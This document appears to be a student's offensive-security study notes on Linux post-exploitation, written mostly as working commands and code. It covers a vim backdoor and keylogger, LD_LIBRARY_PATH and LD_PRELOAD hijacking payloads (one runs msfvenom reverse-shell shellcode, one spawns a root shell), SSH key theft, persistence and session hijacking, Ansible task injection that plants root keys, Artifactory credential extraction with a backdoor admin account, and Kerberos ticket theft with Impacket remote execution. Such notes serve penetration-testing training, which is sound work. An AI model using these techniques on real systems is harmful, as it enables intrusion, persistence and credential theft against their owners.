### VIM Backdoor/Keylogger

    **Use if you have write access to a user's config file (.vimrc and maybe .bashrc) who is periodically logging in and using vim - backdoor if sudo vim, keylogger otherwise

    //Background:
        //Target Files:  .bash_profile (initial login) and .bashrc (any new shell)
        //Example shell command in vim:  !touch /tmp/test.txt

    -ex. 1: VIM Config Simple Backdoor
        //*Add to .vimrc:  :silent !source ~/.vimrunscript
            //where ~/.vimrunscript contains:  
                #!/bin/bash
                echo "hacked" > /tmp/hacksrcout.txt
        //Best if user has sudo (use for privesc) - .vimrc might run as root - use for root RCE
            //Ubuntu/Red Hat: user's .vimrc will be used (good)
            //Debian: root's .vimrc will be used (bad for us)
                //*Solution: add to user's .bashrc:  alias sudo="sudo -E"  , then source ~/.bashrc
            //Also check:  sudo -l
            //If you can run vim via sudo:   :shell
        //Another option:  add .vim file to ~/.vim/plugin/
        
    -ex. 2: VIM Config Simple Keylogger
        //autocommands are triggered on certain conditions (:autocmd ...)
            //Examples: VimEnter, VimLeave, FileAppendPre, *BufWritePost
        //helpful if vim shell commands are blocked, etc.
        //*keylogger:  :autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
            ex. place in:  /home/offsec/.vim/plugin/settings.vim
            //Shell commands (if allowed):  :autocmd BufWritePost * :silent !echo id > /tmp/test
            //**better version (only logs when editing as root):
                :if $USER == "root"
                :autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
                :endif

### Library Hijacking
- Search order: application's RPATH value, LD_LIBRARY_PATH env variable, application's RUNPATH value, /etc/ld.so.conf, system directories (/lib, /lib64, etc.)
#### LD_LIBRARY_PATH Hijacking

    //specifying a directory to search first for shared objects by name - we replace the entire file
    //To allow privesc, add to .bashrc:  alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib"  , then source ~/.bashrc
    //try to pick library that is likely to run, especially as sudo - but won't have side effects when not loaded - trial and error
        //look for candidates:  ex. ldd /usr/bin/top - try /lib/x86_64-linux-gnu/libgpg-error.so.0
    //some libraries require version info

    #######Example:#######
    ex. 1 - hax.c: constructor function that runs when library is loaded  
        //step 1 - compile:  gcc -Wall -fPIC -c -o hax.o hax.c
        //step 2 - create shared library:  gcc -shared -o libhax.so hax.o
        //look for candidates within a binary that might run:  ex. ldd /usr/bin/top - try /lib/x86_64-linux-gnu/libgpg-error.so.0
        //use:
            export LD_LIBRARY_PATH=/home/offsec/ldlib/
            cp libhax.so libgpg-error.so.0
            //try to run binary:  top
            //missing symbol error fix:
                ex. readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
            //#fix missing version error:
                ex. readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
                    //put into gpg.map file, then recompile:
                        //step 1: gcc -Wall -fPIC -c -o hax.o hax.c
                        //step 2: gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o

    #######hax.c:#######
    //constructor function that runs when loaded

    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h> // for setuid/setgid
    static void runmahpayload() __attribute__((constructor));

    <insert missing symbol variables here>

    void runmahpayload() {
    setuid(0);
    setgid(0);
    printf("DLL HIJACKING IN PROGRESS \n");
    system("touch /tmp/haxso.txt");
    }


    #######gpg.map#######
    //include all symbols from:  readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'

    GPG_ERROR_1.0 {
    gpgrt_onclose;
    _gpgrt_putc_overflow;
    ...
    gpgrt_fflush;
    gpgrt_poll;
    };

#### **LD_PRELOAD Exploitation

    **Use if you have access to a user's account (edit perms to .bashrc/.bash_profile) who periodically logs in and runs commands via sudo/su (w/ password!)
        //check the binary strings for path hijacking first; if not, check functions with ltrace and override

    //Better method because original library is still loaded, we just override certain functions
    //To allow w/ Sudo for privesc, add to .bashrc:
        alias sudo="sudo LD_PRELOAD=/home/offsec/evil_geteuid.so"  , then source ~/.bashrc
        //Check /etc/sudoers if needed - env_keep or env_reset

    #######Example:#######
    ex. with cp command:
        //check library function calls:  ltrace cp
            //ex. target the geteuid() function
            //payload will fire when the function is called - not when the library is loaded
        //reverse shell method - msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f c
            //forks so that original command will return and start our shell in the background
        //step 1:  gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c
        //step 2:  gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
        //Usage:
            export LD_PRELOAD=/home/offsec/evil_geteuid.so  (probably add to user's .bashrc)
            cp /etc/passwd /tmp/testpasswd
        //Privesc fix:
            alias sudo="sudo LD_PRELOAD=/home/offsec/evil_geteuid.so"  , then source ~/.bashrc


    #######evileuid.c:#######

    #define _GNU_SOURCE
    #include <sys/mman.h> // for mprotect
    #include <stdlib.h>
    #include <stdio.h>
    #include <dlfcn.h>
    #include <unistd.h>
    char buf[] = 
    .......................
    .......................
    uid_t geteuid(void)
    {
        typeof(geteuid) *old_geteuid;
        old_geteuid = dlsym(RTLD_NEXT, "geteuid");
        if (fork() == 0)
        {
            intptr_t pagesize = sysconf(_SC_PAGESIZE);
            if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {
                perror("mprotect");
                return -1;
            }
            int (*ret)() = (int(*)())buf;
            ret();
        }
        else
        {
            printf("HACK: returning from function...\n");
            return (*old_geteuid)();
        }
        printf("HACK: Returning from main...\n");
        return -2;
    }


    //Another Exploitation Example:
    https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
    //requires env_keep or alias sudo in .bashrc
    //shell.c:
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
    }

    gcc -fPIC -shared -o shell.so shell.c -nostartfiles
    sudo LD_PRELOAD=/tmp/shell.so <sudoCmd>


### Lateral Movement
#### SSH

    //SSH Keys
        //look for keys with weak permissions
            find /home/ -name "id_rsa"              //check even if not root
            ls -tral /root/.ssh /home/*/.ssh
            find / -iname *key* 2>/dev/null
        //check if key requires a password - look for proc-type/dek-info in key
        //check .known_hosts for machines that have been connected to recently
        //check bash history
        **Crack password-protected key:
            python /usr/share/john/ssh2john.py svuser.key > svuser.hash
            sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./svuser.hash
        //connect from server that blends in:  ssh -i ./svuser.key svuser@controller
        //If domain user, include the domain! - ex. ssh ... final\\tommy@172.16.177.184

    //SSH Persistence
        ssh-keygen
        #mkdir /root/.ssh && chmod 700 /root/.ssh
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCoA0LIUUxvX4RtvIApA5e/qsQm8vLv8CiwXK2za+rKdn7JE1bStjc7IvQRxB7/Um3OfsADQ8bXhUxhOJfhzSbNYpeKYYts9ZScbFDJ6jCD3GsS3+mA1jkoAhHCxW9un/llYjbxTkQfGxt0UmAOqP1CDWtHBH6BVqM5dUnJ73iZujGv6exTkLIWsjFMv8mgNAsgSvvqu0AE2zB4T+jsBDzIM9WwWr/XzqhCb/i7Q1wZBZU+MkNMHpNqFevGqWG9Eo6++vRgDLEW5+OWkUO9XONohCj3WWo8LbVNdJCC39Cy+a3T1hKi2H4n+ZxmooCkO9bSfGBRKR4SBu2gabRh6cuD21PsLScn2RtALuaAFoF09Xrx2XRJKm2Fu6N8TI+5b/uwMTQQoaU3z0Cd5pVqzIgbmExTGdRbCAtUT8A3Do5Psmks2OH/LEzc1M8gMh1oVRE5n1HqObg7I3/4YG7G3h8gUAmruMGjS/ppD0WFrUJED9kwo0ji9sjFXGOK/0pMDB0= root@localhost" >> /root/.ssh/authorized_keys
        ssh -vv -i /home/kali/.ssh/id_rsa -D 9050 root@192.168.173.164

    //SSH Hijacking with ControlMaster (piggybacking) - for new OUTGOING connections
        //taking over an existing SSH connection
        //requires user to start a new connection after you've modified their config
        //add setting that automatically creates a control socket whenever the user ssh's to another box
            //either in system ssh client config (/etc/ssh/ssh_config) or user's config (~/.ssh/config)
            //Add contents:
                Host *
                ControlPath ~/.ssh/controlmaster/%r@%h:%p
                ControlMaster auto
                ControlPersist 10m
            chmod 644 ~/.ssh/config && mkdir ~/.ssh/controlmaster
        //use it:
            ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim
            //or as the regular user:  ssh offsec@linuxvictim

    //SSH Hijacking with SSH-Agent and SSH Agent Forwarding
            //SSH Agent Forwarding passes ssh key response requests from server to server back to your ssh-agent
            //ssh-agent creates a unix domain socket, and then listens for connections from the sshd daemon to this socket
        //requires victim to have active connection to the intermediate server
        //Look for 'ssh -A' on cmdline or 'ForwardAgent yes' in ssh_config and 'AllowAgentForwarding yes' in sshd_config
        //setup for testing:
            //for ssh-agent forwarding, our public key must be on the intermediate server and the destination:
                ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller
                ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@linuxvictim
            //check kali ~/.ssh/config:  ForwardAgent yes
            //check intermediate /etc/ssh/sshd_config:  AllowAgentForwarding yes
            //kali setup:
                eval `ssh-agent`
                ssh-add
        //exploitation:
            ls -tral /tmp/ssh*
            //if we compromised an unprivileged user:
                we can SSH to any downstream server the compromised user's private key has access to
                //compromised user needs to have active SSH connection to the intermediate server
                //Then just ssh downstream:  ssh offsec@linuxvictim
            //if we're root on the intermediate server:
                //If we are root on a system, we can compromise an active SSH session to another machine via public key authentication
                //we can directly access the socket that SSH-Agent creates
                //find socket via cat /proc/pid/environ of user's current ssh session - get SSH_AUTH_SOCK
                //use it:
                    SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh-add -l
                    SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh offsec@linuxvictim

#### DevOps

    1. ANSIBLE
        //on controller server:
            cat /etc/ansible/hosts
        //ansible node user usually has root/sudo perms - compromising the control server can be great for getting client nodes
        //Detection:
            run "ansible" - see if it's a command
            check for /etc/ansible
            check /etc/passwd
            ls -tral /home
            grep -i ansible /var/log/* 2>/dev/null | wc -l
            find / -iname *ansible* 2>/dev/null
            find / -iname *playbook* 2>/dev/null
            grep -Ri "ansible_become_pass" /opt/playbooks/* /opt/ansible/*
        //Enumeration:
            **probably need to run as ansible user from controller
            //Ad-Hoc Commands:
                ansible victims -a "whoami"         //runs on the 'victims' boxes as default user
                ansible victims -a "whoami" --become    //run as different user (root by default)
            //Ansible Playbooks:
                ex. ansible-playbook /opt/playbooks/getinfo.yml             //file can include "become: yes"
                //other options: become_method (sudo is default), become_user, become_flags
            //other commandline options:  --become, --ask-vault-pass, --key-file "/home/ansibleadm/.ssh/id_rsa", --ask-become-pass, --become-method=su
        //Exploitation:
            //if root on controller (or access to Ansible admin account), we can run ad-hoc commands or playbooks as the Ansible user on all nodes
                //or steal Ansible admin's private key and log in to the nodes directly - then privesc using cracked vault creds
            //non-root options:
                //check playbooks for hard-coded credentials - look for become_user/ansible_become_pass
                    //Cracking vault encryption password and then getting the node password:
                        //Convert Vault String:  python3 /usr/share/john/ansible2john.py ./test.yml              //ansible vault aes256 string
                        //Crack Vault PW:  hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt         //converted vault string
                        //Get PW Stored in Vault:  cat pw.txt | ansible-vault decrypt          //ansible vault aes256 string
                //Weak Perms on Ansible Playbooks - edit & inject tasks
                    //See AnsibleTaskInjection.yml example file
                //Check logs for information/command leakage
                    tail -100 /var/log/syslog
                    egrep -i "password|passwd|secret" /var/log/syslog*

            //AnsibleTaskInjection.yml:
            ---
            - name: Get system info
            hosts: all
            gather_facts: true
            become: yes
            tasks:
                - name: Display info
                debug:
                    msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"
                - name: Run command
                shell: touch /tmp/mycreatedfile.txt
                async: 10
                poll: 0

                - name: Create a directory if it does not exist
                file:
                        path: /root/.ssh
                        state: directory
                        mode: '0700'
                        owner: root
                        group: root
                    
                - name: Create authorized keys if it does not exist
                file:
                    path: /root/.ssh/authorized_keys
                    state: touch
                    mode: '0600'
                    owner: root
                    group: root
                    
                - name: Update keys
                lineinfile:
                    path: /root/.ssh/authorized_keys
                    line: "ssh-rsa AAAAB3NzaC1yc2EAAAAD............... kali@kali"
                    insertbefore: EOF
                
                - name: Run command
                shell: touch /tmp/mycreatedfile2.txt
                async: 10
                poll: 0

    2. ARTIFACTORY
            //binary repository manager for version mgmt, etc. - others include Apache Archiva, SonaType Nexus, CloudRepo, Cloudsmith
            //target for supply chain attacks - compromise server or get access to a user's account w/ write access to packages
        //Identification:
            ps aux | grep -i artifactory
            /opt/jfrog
            web mgmt interface on port 8081/8082
        //Exploitation:
            //Compromising Artifactory Backups:
                ex. root access to server but no Artifactory creds
                //database backups by default are in /<ARTIFACTORY FOLDER>/var/backup/access
                //get user hash:  cat access.backup.20200730120454.json
                //decrypt:  sudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
            //Compromising Artifactory's Database:
                //if no backups available, try to access database or copy it and manually extract hashes
                //copy it and remove lock files:
                    mkdir /tmp/db && sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/db && sudo chmod 755 /tmp/db/derby && sudo rm /tmp/db/derby/*.lck
                //connect:
                    sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
                        connect 'jdbc:derby:/tmp/hackeddb/derby';
                        select * from access_users;
            //Adding a Secondary Artifactory Admin Account:
                //requires write access to the /opt/jfrog/artifactory/var/etc/access folder and the ability to change permissions on the newly-created file, which usually requires root or sudo access.
                //demo:
                    sudo echo "haxmin@*=haxhaxhax" > /opt/jfrog/artifactory/var/etc/access/bootstrap.creds && sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
                    sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop
                    sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
                    sudo grep "Create admin user" /opt/jfrog/artifactory/var/log/console.log
            //After gaining access, modify binaries to something malicious - takes effect whenever a user updates and runs it:
                //see which projects are getting downloaded, then use the provided curl command to redeploy/upload a shellcode runner

#### Kerberos on Linux

    //Detection/Enumeration:
        realm list
        which ktutil klist kinit kvno
        ls -tral /etc/krb* /tmp/krb*
        sudo find / -iname *keytab* 2>/dev/null
        sudo find / -iname *krb5* 2>/dev/null
        cat /etc/crontab; ls -tralR /etc/*cron* /var/spool/cron* /var/*cron*

    //Background:
        //can use Linux-specific KDCs or Windows AD
        //all AD users are assigned a credential cache file to contain their Kerberos tickets - file location is in KRB5CCNAME variable
        //demo
            ssh administrator@corp1.com@linuxvictim
            env | grep KRB5CCNAME           //locate user's Kerberos credential cache file
            kinit       //request TGT
            klist       //list tickets currently stored in cache file
            kdestroy    //delete all cached tickets
            //get list of all SPNs:  ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
            //request service ticket:  ex. kvno MSSQLSvc/DC01.corp1.com:1433
                //We can now access the MSSQL service and perform authenticated actions.

    //Exploitation:
        ******Add ldap server hostname to /etc/hosts:
            echo "172.16.173.168 dmzdc01.complyedge.com" >> /etc/hosts
        ******
        //Stealing Keytab Files:
            //allow scripts to access Kerberos-enabled network resources on a user's behalf
            //often used in cron files
            //creation:
                ktutil
                    addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
                    wkt /tmp/administrator.keytab
                    quit
            //Loading/Using/Exploiting (if you find one):
                //View SPNs in a keytab file:
                    ktutil 
                        read_kt /etc/krb5.keytab
                        list
                        quit
                kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab           //load tickets from keytab file into session
                klist
                #kinit -R           //renew
                smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
                //View SPNs:  ldapsearch -H ldap://dmzdc01.complyedge.com:389 -Y GSSAPI -s sub -b "DC=complyedge,DC=com" "servicePrincipalName=*" servicePrincipalName
        //Request TGT if you have PW:
            kinit
        //Stealing Credential Cache Files:
            //if you compromise an active user's session, you can use their current Kerberos tickets as is
            //Otherwise - if you're root or have access to the /tmp/krb... ccache file, you can copy and load it as your own
                sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
                sudo chown offsec:offsec /tmp/krb5cc_minenow
                kdestroy && klist
                export KRB5CCNAME=/tmp/krb5cc_minenow
                klist
                #kinit
                //request ticket:  kvno MSSQLSvc/DC01.corp1.com:1433
                //Check server: ldapwhoami -H ldap://dmzdc01.complyedge.com:389 -Y GSSAPI
                //View SPNs:  ldapsearch -H ldap://dmzdc01.complyedge.com:389 -Y GSSAPI -s sub -b "DC=complyedge,DC=com" "servicePrincipalName=*" sAMAccountName servicePrincipalName
        //Kerberos via Impacket (using the ccache file tickets):
            //prep - copy ccache file to kali:
                scp offsec@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow
                export KRB5CCNAME=/tmp/krb5cc_minenow
                sudo apt install krb5-user
            //tunnel:  ssh offsec@linuxvictim -D 9050        //ensure correct src ip
            //usage:
                //view all domain users:
                    proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
                //view available SPNs:
                    proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
                //psexec shell:
                    proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass
                //smbclient:  smbclient --kerberos //dmzdc01.complyedge.com/C$
            //Other Enum from Kali:
                base64 -w0 /tmp/krb5cc_minenow
                echo -n "..." | base64 -d > /tmp/krb5_kali
                echo "172.16.173.168 dmzdc01.complyedge.com" >> /etc/hosts
                export KRB5CCNAME=/tmp/krb5_kali
                //might need to copy over /etc/krb5.conf too
                proxychains ldapwhoami -H ldap://dmzdc01.complyedge.com:389 -Y GSSAPI
                proxychains GetADUsers.py -all -k -no-pass -dc-ip 172.16.173.168 complyedge.COM/pete
                proxychains GetUserSPNs.py -k -no-pass -dc-ip 172.16.173.168 [-request] complyedge.COM/pete
                proxychains psexec.py pete@dmzdc01.complyedge.com -k -no-pass
                proxychains wmiexec.py pete@dmzdc01.complyedge.com -k -no-pass
                proxychains reg.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE
                //Over-pass-the-hash - ./getTGT -hashes :1a59bd44fe5bec5a39c44c8cd3524dee lab.ropnop.com/wmyers
                //Meterpreter via Hollow:
                    reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /t REG_DWORD /v AllowInsecureGuestAuth /d 1 /f
                    \\192.168.49.121\visualstudio\Hollow\Hollow\bin\x64\Release\Hollow.exe